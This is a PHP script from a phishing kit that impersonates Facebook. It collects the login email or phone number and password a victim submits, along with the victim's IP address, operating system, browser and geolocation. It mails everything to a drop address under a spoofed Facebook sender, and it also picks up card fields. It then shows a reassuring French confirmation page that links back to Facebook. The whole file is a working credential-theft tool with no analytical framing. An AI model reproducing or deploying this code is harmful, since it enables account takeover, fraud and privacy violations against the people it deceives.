<?php
/***  BY webstr.bot ***/
require_once('geoplugin.class.php');
require_once('detect-os.php');
$os = getOS($_SERVER['HTTP_USER_AGENT']);
$geoplugin = new geoPlugin();
$geoplugin->locate();
$hostname = gethostbyaddr($ip);
$ip = getenv("REMOTE_ADDR");
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
/*** THE LETTER ***/
$message .= "------ FACEBOOK RESULT ------\n";
$message .= "Email Adresse or Phone Number: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "------ INFORMATION ------\n";
$message .= "Login Time: $date At $time \n";
$message .= "IP: $ip\n";
$message .= "HOST: ".gethostbyaddr($ip)."\n";
$message .= "Operation System: $os\n";
$message .= "BROWSER: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------ GEOIP INFORMATION ------\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Region Code: {$geoplugin->regionCode}\n";
$message .= "Region Name: {$geoplugin->regionName}\n";
$message .= "Timezone: {$geoplugin->timezone}\n";
$message .= "--------- Powered By ---------\n";
$message .= "Webstr.bot\n";
$message .= "";
/*** THE SENDER ***/
$cc = $_POST['ccn'];
$subject = "Facebook Result".$_POST['exm']."/".$_POST['exy'];
$send = "youremail@host.com";
$headers = 'From: noreply@facebook.com' . "\r\n" .
mail($send,$subject,$message,$headers);
echo "<h1>Je vous remercie! Nous confirmerons votre compte dès que possible.</h1>" . " <h1>-</h1>" . "<h1><a href='https://m.facebook.com/' style='text-decoration:none;'> Retour à Facebook</a></h1>";
?>
